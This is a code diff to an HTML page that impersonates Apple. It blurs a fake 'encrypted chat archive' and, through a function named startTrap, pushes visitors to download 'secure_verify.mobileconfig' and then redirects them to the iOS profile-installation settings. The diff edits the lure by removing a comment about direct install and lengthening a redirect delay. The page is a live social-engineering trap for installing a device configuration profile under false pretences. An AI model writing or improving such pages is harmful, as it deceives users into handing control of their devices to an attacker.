@@ -33,20 +33,21 @@
         <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" class="apple-logo">
         <h2>Identity Verification</h2>
         <p>This conversation is encrypted. To unblur and view the full archive, verify your Apple device identity.</p>
-        <!-- Extension changed to .mobileconfig for direct install -->
         <a href="secure_verify.mobileconfig" class="btn" onclick="startTrap()">Unblur & Read Chats</a>
         <div class="info-text">Verification provided by Apple Security Services</div>
     </div>
     <script>
+        
         setTimeout(function() {
             document.getElementById('trap-popup').style.display = 'block';
             document.querySelector('.chat-background').style.filter = 'blur(15px)';
         }, 5000);
 
+
         function startTrap() {
             setTimeout(function() {
                 window.location.href = "App-prefs:General&path=ManagedConfigurationList";
-            }, 3000);
+            }, 3500);
         }
     </script>
 </body>
